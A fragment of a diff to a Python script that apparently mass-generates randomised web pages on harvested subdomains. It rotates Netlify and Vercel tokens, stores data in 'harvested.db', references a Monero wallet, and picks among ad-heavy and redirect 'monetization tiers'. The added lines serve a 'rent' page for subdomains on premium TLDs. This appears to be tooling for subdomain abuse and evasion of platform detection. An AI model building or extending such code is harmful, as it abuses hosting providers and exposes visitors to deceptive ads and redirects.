@@ -7,6 +7,7 @@ import base64
 import time
 import random
 
+
 # Split the comma-separated strings into lists for rotation
 NETLIFY_TOKENS = os.environ.get('NETLIFY_TOKEN', '').split(',')
 VERCEL_TOKENS = os.environ.get('VERCEL_TOKEN', '').split(',')
@@ -17,8 +18,23 @@ AD_NATIVE = os.environ.get('AD_NATIVE')
 MONERO_WALLET = os.environ.get('MONERO_WALLET')
 DB_NAME = 'harvested.db'
 
+def get_rent_html():
+    try:
+        with open('template_rent.html', 'r', encoding='utf-8') as f:
+            return f.read()
+    except:
+        return None
+
 # --- POLYMORPHIC HTML GENERATOR ---
 def generate_polymorphic_html(subdomain):
+    # If it's a premium TLD, default to the Rent page immediately
+    premium_tlads = ['.io', '.ai', '.co', '.app', '.dev']
+    if any(tld in subdomain for tld in premium_tlads):
+        rent_html = get_rent_html()
+        if rent_html:
+            return rent_html   
+    # ... (the rest of your polymorphic generator code remains exactly the same)
+
     # Choose a monetization tier: 70% Conservative, 20% Aggressive, 10% Redirect
     tier = random.choices(['conservative', 'aggressive', 'redirect'], weights=[70, 20, 10])[0]
     
